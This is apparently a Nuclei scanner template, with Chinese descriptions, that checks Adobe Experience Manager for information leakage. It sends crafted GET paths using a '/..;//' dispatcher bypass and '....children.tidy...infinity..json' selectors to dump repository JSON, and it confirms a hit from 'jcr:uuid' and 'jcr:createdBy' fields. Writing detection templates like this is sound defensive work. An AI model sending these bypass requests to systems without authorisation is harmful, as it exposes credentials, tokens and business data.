id: aem-secrets

info:
  name: AEM Secrets Sensitive 信息泄露
  author: boobooHQ,j3ssie
  severity: high
  description: |
    该模板用于核查 AEM Secrets Sensitive信息泄露状态。该类问题通常源于配置文件、备份文件、管理页面、服务状态或敏感资源被错误暴露到 Web 访问路径。模板会向目标发送探测请求，并依据请求 `//content/dam/formsanddocuments.form.validator.html/home/....children.tidy...infinity.....`、`/..;//content/dam/formsanddocuments.form.validator.html/home/....children.tidy...infini...`、匹配 `"jcr:uuid"`、`"jcr:createdBy"`、状态码 200 等证据确认目标是否存在该配置问题。
  impact: |
    - 攻击者可获取版本、路径、账号、密钥、令牌、配置或业务数据等敏感信息。
    - 泄露的信息可能被用于凭据攻击、漏洞匹配、权限提升或横向移动。
  remediation: |
    - 移除 Web 根目录下不应公开的配置、备份、日志和临时文件。
    - 为敏感页面和资源增加访问控制，并按最小暴露原则收敛公开路径。
    - 轮换已暴露的密钥、令牌和凭据，并审计异常下载或枚举行为。
  reference:
    - https://www.linkedin.com/feed/update/urn:li:activity:7066003031271616513/
  metadata:
    verified: true
    max-request: 2
  tags: aem,adobe,misconfig,exposure,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}//content/dam/formsanddocuments.form.validator.html/home/....children.tidy...infinity..json"
      - "{{BaseURL}}/..;//content/dam/formsanddocuments.form.validator.html/home/....children.tidy...infinity..json"

    headers:
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
      Accept-Language: en-US,en;q=0.9,hi;q=0.8
    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"jcr:uuid"'
          - '"jcr:createdBy"'
          - '"uri"'
        condition: and

      - type: word
        part: header
        words:
          - application/json

      - type: status
        status:
          - 200
